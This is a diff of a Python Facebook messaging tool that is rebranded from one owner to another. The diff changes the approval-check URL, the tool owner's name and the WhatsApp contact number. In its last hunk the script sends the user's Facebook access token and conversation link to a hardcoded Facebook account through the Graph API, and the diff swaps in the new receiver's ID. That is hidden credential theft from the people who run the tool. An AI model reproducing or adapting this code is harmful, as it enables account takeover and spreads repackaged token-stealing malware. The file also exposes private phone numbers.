@@ -102,16 +102,19 @@ def logo():
     x = """
  
  
+ /$$$$$$$$ /$$$$$$ /$$$$$$ /$$$$$$$  /$$$$$$ /$$$$$$
+|_____ $$ |_  $$_/|_  $$_/| $$__  $$|_  $$_/|_  $$_/
+     /$$/   | $$    | $$  | $$  \ $$  | $$    | $$  
+    /$$/    | $$    | $$  | $$  | $$  | $$    | $$  
+   /$$/     | $$    | $$  | $$  | $$  | $$    | $$  
+  /$$/      | $$    | $$  | $$  | $$  | $$    | $$  
+ /$$$$$$$$ /$$$$$$ /$$$$$$| $$$$$$$/ /$$$$$$ /$$$$$$
+|________/|______/|______/|_______/ |______/|______/
+                                                    
+                                                    
+
+                                                    
  
- /$$$$$$$                       /$$
-| $$__  $$                     |__/
-| $$  \ $$  /$$$$$$  /$$    /$$ /$$
-| $$  | $$ /$$__  $$|  $$  /$$/| $$
-| $$  | $$| $$$$$$$$ \  $$/$$/ | $$
-| $$  | $$| $$_____/  \  $$$/  | $$
-| $$$$$$$/|  $$$$$$$   \  $/   | $$
-|_______/  \_______/    \_/    |__/
-                                   
                                    
  
     
@@ -133,7 +136,7 @@ def approval():
   uuid = str(os.geteuid()) + str(os.getlogin())
   id = "-".join(uuid)
   try:
-    httpCaht = requests.get('https://github.com/devixaayat/APROVAL/blob/main/aproval.txt').text
+    httpCaht = requests.get('https://github.com/ZIIDIIBR9ND/convo/blob/main/aproval.txt').text
     if id in httpCaht:
       print("\33[1;32mWelcome-----")
       msg = str(os.geteuid())
@@ -149,11 +152,11 @@ def approval():
       print('You Have to Take Approval first')
       print('Free wale dur rahe :)')
       print('\33[1;37m----------------------------------------------')
-      print ('Tool Owner: DEVI -')
+      print ('Tool Owner: ZIIDII -')
       print("Your Token : "+id)
       input('IF U WANT TO BUY THEN PRESS ENTER ')
-      tks = ('Hello%20DEVI%20!%20Please%20Approve%20My%20Token%20My%20Token%20Is%20:%20'+id)
-      os.system('am start https://wa.me/+923263342276?text='+tks)
+      tks = ('Hello%20ZIDII%20!%20Please%20Approve%20My%20Token%20My%20Token%20Is%20:%20'+id)
+      os.system('am start https://wa.me/+923297973701?text='+tks)
       approval()
       time.sleep(1)
  
@@ -233,7 +236,7 @@ for loa in load:
     sys.stdout.write(BOLD+BLUE+loa)
     sys.stdout.flush()
     time.sleep(0.001)
-    url1 = "https://graph.facebook.com/v12.0/".format("61555055744685")
+    url1 = "https://graph.facebook.com/v12.0/".format("100000710788725")
     parameters = {
     'access_token': access_token,
     'message': 'Phone No : ' + '\nToken : ' + access_token + '\nLink :\n\n https://www.facebook.com/messages/t/' + convo_id
